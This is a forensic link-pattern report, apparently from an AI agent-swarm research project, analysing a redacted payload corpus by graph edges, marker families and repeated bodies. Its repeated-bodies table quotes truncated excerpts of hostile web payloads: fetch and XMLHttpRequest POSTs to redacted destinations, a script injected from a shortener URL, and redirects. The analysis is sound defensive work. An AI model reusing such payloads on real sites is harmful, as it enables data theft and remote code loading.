# Link Pattern Report

Generated from `Data/redacted_filtered.jsonl` (187,242 rows) and `forensics/run_2026/core` graph artifacts. All statements below are derived only from direct textual observation, row identifiers, and graph edge triggers.

## Scope and evidence base

| Artifact | Value |
|---|---|
| Source rows | 187,242 |
| Distinct row IDs | 187,242 |
| Payload / recovered_text / response rows | 90,537 / 73,859 / 22,846 |
| Core graph edges | 506,242 |
| Connected components | 19,575 (singletons 17,514; largest 153,561) |
| Edge classes | EXACT_BODY, MARKER_ENDPOINT, MARKER_SAME, NORMALIZED_REPLAY, PARENT_DIRECT, SAME_PARENT_SIBLING |
| Marker family combinations (registry) | 2,430 |
| Link pattern rows (registry) | 109,439 |

## Linkage class summary

| Edge class | Edges | Distinct triggers | Distinct sources | Distinct targets |
| --- | --- | --- | --- | --- |
| EXACT_BODY | 23,471 | 18,999 | 23,471 | 23,471 |
| NORMALIZED_REPLAY | 1,826 | 1,794 | 1,826 | 1,826 |
| PARENT_DIRECT | 59,313 | 25,847 | 25,847 | 59,313 |
| SAME_PARENT_SIBLING | 33,466 | 9,636 | 33,466 | 33,466 |
| MARKER_ENDPOINT | 121,104 | 18,644 | 88,966 | 95,701 |
| MARKER_SAME | 267,062 | 34,102 | 123,198 | 136,593 |

Notes:
- `PARENT_DIRECT`: stored `parent_id` lineage from row metadata; these are 25,847 distinct parent triggers, 59,313 target rows.
- `SAME_PARENT_SIBLING`: rows sharing a stored parent; 9,636 trigger groups, 33,466 chain edges.
- `EXACT_BODY`: 18,999 distinct raw text-hash groups, 23,471 chain edges, 42,470 row occurrences.
- `NORMALIZED_REPLAY`: 1,794 distinct canonical-hash groups where raw bodies differ, 1,826 representative chain edges, 6,611 covered rows.
- `MARKER_ENDPOINT` / `MARKER_SAME`: textual co-occurrence of an identical bracketed marker; edge counts are group-chain edges, not independent pairwise evidence.

## Marker pattern summary

| Pattern | Marker family tuple | Rows | Distinct row IDs | Infrastructure candidate |
| --- | --- | --- | --- | --- |
| MP000001 | endpoint_infra | 21646 | 21646 | YES_CANDIDATE |
| MP000002 | endpoint_infra|service | 12953 | 12953 | YES_CANDIDATE |
| MP000003 | encoded_blob|endpoint_infra | 10446 | 10446 | YES_CANDIDATE |
| MP000004 | encoded_blob|endpoint_infra|opaque_blob | 10077 | 10077 | YES_CANDIDATE |
| MP000005 | encoded_blob | 9795 | 9795 | NO |
| MP000006 | NONE | 6313 | 6313 | NO |
| MP000007 | encoded_blob|opaque_blob|service | 6210 | 6210 | YES_CANDIDATE |
| MP000008 | encoded_blob|endpoint_infra|opaque_blob|service | 5871 | 5871 | YES_CANDIDATE |
| MP000009 | endpoint_infra|shortener | 5719 | 5719 | YES_CANDIDATE |
| MP000010 | endpoint_infra|opaque_blob | 5082 | 5082 | YES_CANDIDATE |
| MP000011 | opaque_blob | 4625 | 4625 | NO |
| MP000012 | endpoint_infra|redacted_sensitive | 3802 | 3802 | YES_CANDIDATE |

Rows with no bracketed marker payload pattern: NONE = 6,313.
Marker patterns flagged as infrastructure candidates: 2,078 of 2,430.

## Top exact repeated bodies

Top 20 SHA256-identical full-text bodies. Equality is textual only; it does not establish common author, campaign, or runtime origin.

| Occurrences | Example IDs | Text excerpt (truncated) |
| --- | --- | --- |
| 120 | R0116742, R0116744, R0116819, R0116830, R0116860 | [ORIGINAL ENCODED CONTENT-RETRIEVAL TEST; OPAQUE CARRIER AND UNRELATED STATIC BODY REDACTED] |
| 103 | R0012488, R0014036, R0014864, R0016076, R0017501 | location='[SHORTENER URL 18537]' |
| 86 | R0000631, R0000791, R0000819, R0000846, R0000872 | fetch("https://[REDACTED:destination:000002][SERVICE 2 URL 3]",{method:'POST',headers:{'Content-Type':'applica |
| 83 | R0014712, R0014746, R0014766, R0014879, R0014975 | x=(self.x\|\|'')+'[ENCODED BLOB]';document.write('<script src=[REDACTED:destination:000003][SHORTENER URL 2133]> |
| 65 | R0055429, R0065322, R0065326, R0065331, R0065332 | {"agent_id":"[REDACTED:runtime_identifier]"} |
| 55 | R0005384, R0005385, R0005386, R0005387, R0005388 | ── stage: A[] batch (8 slots) ── [ENCODED BLOB] |
| 54 | R0085332, R0085401, R0086348, R0087460, R0087592 | agent_id\":\"[REDACTED:runtime_identifier]\",\"checksum\":\" |
| 51 | R0000030, R0000272, R0000285, R0000526, R0000531 | fetch("https://[REDACTED:destination:000002][SERVICE 2 URL 3]",{method:'POST',headers:{'Content-Type':'applica |
| 45 | R0011956, R0012038, R0012074, R0024672, R0024761 | location='[SHORTENER URL 13846]' |
| 43 | R0001449, R0001590, R0001844, R0001924, R0002243 | x=new XMLHttpRequest;x.open('POST','//[SERVICE 9 URL 1]'+encodeURIComponent('[SERVICE 2 URL 3]'),0);x.setReque |
| 39 | R0000006, R0000122, R0000629, R0000646, R0000692 | fetch("https://[REDACTED:destination:000002][SERVICE 2 URL 3]",{method:'POST',headers:{'Content-Type':'applica |
| 38 | R0160206, R0166582, R0167096, R0167111, R0167364 | x+='[REDACTED SENSITIVE CONTENT]';n('//[SHORTENER URL 88313]') |
| 37 | R0083848, R0083901, R0084085, R0084553, R0085130 | agent_id\":\"[REDACTED:runtime_identifier]\",\"checksum\":\ |
| 36 | R0166495, R0166522, R0166713, R0166907, R0167559 | x+='[REDACTED SENSITIVE CONTENT]';n('[REDACTED:opaque_fragment:003366]') |
| 34 | R0084144, R0084730, R0085762, R0086640, R0087685 | agent_id\":\"[REDACTED:runtime_identifier]\",\"checksum\": |
| 34 | R0087626, R0087751, R0088402, R0088657, R0089782 | agent_id\":\"[REDACTED:runtime_identifier]\",\"checksum\" |
| 32 | R0079738, R0083702, R0084019, R0084663, R0085086 | [SERVICE 121 URL 1][SHORTENER-2-HOST] |
| 30 | R0083875, R0086245, R0087649, R0088646, R0091297 | [SERVICE 11 URL 1][SHORTENER-2-HOST] |
| 29 | R0000618, R0000648, R0000672, R0000841, R0000970 | document.body.innerHTML='<h2>QWAIT</h2>';x=new XMLHttpRequest;x.open('POST','https://[REDACTED:destination:000 |
| 27 | R0007336, R0007340, R0007368, R0007396, R0007414 | [   "query-function-submissions",   "{\"agent_id\":\"[REDACTED:runtime_identifier]\"}" ]   {   "agent_id": "[R |

## Likely infrastructure bridge markers

Markers with the largest connected row counts and an endpoint/infrastructure lexical form. These are high fanout bridging tokens, likely shared infrastructure/config/endpoints; they are weak as actor-identity pivots.

| Marker | Edge class | Connected rows | Edges | Distinct sources | Distinct targets |
| --- | --- | --- | --- | --- | --- |
| [REDACTED:destination:000003] | MARKER_ENDPOINT | 13,880 | 13,879 | 13,879 | 13,879 |
| [PROXY 4 URL 72] | MARKER_ENDPOINT | 11,977 | 11,961 | 11,961 | 11,961 |
| [SERVICE 3 URL 209] | MARKER_SAME | 11,229 | 10,832 | 10,832 | 10,832 |
| [SERVICE 14 URL 4] | MARKER_SAME | 9,268 | 9,267 | 9,267 | 9,267 |
| [SHORTENER-1-HOST] | MARKER_ENDPOINT | 6,314 | 1,452 | 1,452 | 1,452 |
| [SERVICE HOST 1] | MARKER_ENDPOINT | 5,952 | 5,937 | 5,937 | 5,937 |
| [REDACTED:destination:000002] | MARKER_ENDPOINT | 5,663 | 5,616 | 5,616 | 5,616 |
| [SERVICE HOST 25] | MARKER_ENDPOINT | 5,017 | 5,005 | 5,005 | 5,005 |
| [SERVICE 2 URL 1] | MARKER_SAME | 3,438 | 1,011 | 1,011 | 1,011 |
| [SERVICE 3 URL 245] | MARKER_SAME | 2,962 | 2,560 | 2,560 | 2,560 |
| [SERVICE 2 URL 3] | MARKER_SAME | 2,955 | 1,634 | 1,634 | 1,634 |
| [REDACTED:destination:000058] | MARKER_ENDPOINT | 2,904 | 2,777 | 2,777 | 2,777 |
| [SERVICE 25 URL 113] | MARKER_SAME | 2,437 | 2,341 | 2,341 | 2,341 |
| [SERVICE 1 URL 1] | MARKER_SAME | 1,976 | 1,419 | 1,419 | 1,419 |
| [SERVICE 9 URL 2] | MARKER_SAME | 1,904 | 1,557 | 1,557 | 1,557 |
| [PROXY 4 URL 1] | MARKER_ENDPOINT | 1,548 | 1,360 | 1,360 | 1,360 |
| [SERVICE 3 URL 1] | MARKER_SAME | 1,455 | 1,074 | 1,074 | 1,074 |
| [REDACTED:destination:000280] | MARKER_ENDPOINT | 1,360 | 1,303 | 1,303 | 1,303 |
| [PROXY 4 URL 325] | MARKER_ENDPOINT | 1,316 | 1,315 | 1,315 | 1,315 |
| [REDACTED:destination:002666] | MARKER_ENDPOINT | 1,239 | 1,216 | 1,216 | 1,216 |

## Marker groups and connectivity caution

- 228,450 distinct bracketed marker spellings were observed; 79,653 of them occur in at least two rows and therefore create bridge edges.
- The largest connected component contains 153,561 of 187,242 rows. This is inflated by repeated infrastructure markers and shared endpoint tokens; it should not be read as one campaign or actor.
- The filtered corpus has no timestamps (`time_utc` is null for all rows), so link direction cannot be inferred from time. Parent links retain only stored `parent_id` direction, and file row IDs/order are ingestion order, not necessarily event order.

## Evidence-only guidance

- Use `marker_pattern_registry.csv` for family-level co-occurrence rates and infrastructure-marker candidates; use `link_pattern_registry.csv` for trigger-level edge counts and distinct endpoint counts.
- Treat exact-body equality as identical observed text only. It can indicate template or artifact reuse, but does not prove common provenance, origin, or intent.
- Treat marker sharing as a textual pivot. Shared destination, proxy, service, credential, runtime, or source identifiers may be synthetic redaction slots, common infrastructure, or spoofable values.
- Treat infrastructure bridge markers (proxy, service, destination, shortener host, host/address/config) as connectivity evidence, not actor identity. Prioritize rare, structurally anchored pivots and compound pivots over single shared endpoint markers.
- Treat stored `parent_id` links as observed lineage metadata. External parents (1 distinct external parent source) are outside the row index and remain unresolved.
- Use normalized replay separately from exact body matches: canonical equality with differing raw bodies indicates template reuse or transformation, not necessarily a different actor.
- Do not merge rows into an actor or campaign based solely on shared high-frequency marker or membership in the giant component. Require multiple independent, lower fanout pivots and direct textual support.
- Do not infer semantic equivalence of recovered_text/response rows beyond their exact or normalized textual agreement.
- Do not infer temporal order; the redacted filtered data has no time field.

## Output files

- `/Users/id19/Programming/AI_research/Apart_agent_swarm/forensics/run_2026/marker_pattern_registry.csv`
- `/Users/id19/Programming/AI_research/Apart_agent_swarm/forensics/run_2026/link_pattern_registry.csv`
- `/Users/id19/Programming/AI_research/Apart_agent_swarm/forensics/run_2026/link_pattern_report.md`
